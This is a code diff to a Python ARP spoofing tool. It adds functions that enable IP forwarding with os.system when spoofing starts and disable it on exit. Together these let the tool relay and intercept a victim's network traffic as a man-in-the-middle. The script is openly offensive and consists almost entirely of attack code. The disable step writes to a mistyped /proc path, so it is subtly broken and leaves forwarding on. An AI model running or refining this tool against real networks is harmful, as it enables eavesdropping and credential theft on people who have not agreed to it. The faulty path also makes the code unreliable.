@@ -5,6 +5,7 @@ import time
 import sys
 import argparse
 from colorama import Fore
+import os
 
 red = Fore.RED
 green = Fore.LIGHTGREEN_EX
@@ -32,6 +33,14 @@ def get_arguments():
     parse.add_argument("-g", "--gateway-ip", dest="gateway_ip", help="IP address of the router", required=True)
     parse.add_argument("-i", "--interface", dest="interface", help="Network interface to use", default="eth0")
     return parse.parse_args()
+
+def enable_ip_forwarding():
+    print(green + "[+] Enabling IP forwarding....")
+    os.system("echo 1 >  /proc/sys/net/ipv4/ip_forward")
+
+def disable_ip_forwarding():
+    print(red + "[-] Disabling IP forwarding....")
+    os.system("echo 0 > /proc/sys/ipv4/ip_forward")
 
 def get_mac(ip, interface):
     try:
@@ -69,6 +78,7 @@ gateway_ip = args.gateway_ip
 interface = args.interface
 
 if target_ip and gateway_ip:
+    enable_ip_forwarding()
     try:
         print(green + "[+] Started spoofing...")
         target_mac = get_mac(target_ip, interface)
@@ -89,6 +99,7 @@ if target_ip and gateway_ip:
         print(red + "\n[-] Quitting using Ctrl+C. Resetting ARP tables, please wait...")
         restore(gateway_ip, target_ip, interface)
         restore(target_ip, gateway_ip, interface)
+        disable_ip_forwarding()
         print(green + "[+] ARP tables restored.")
 else:
     print(red + "[-] Please specify both target IP and gateway IP using -t and -g options.")
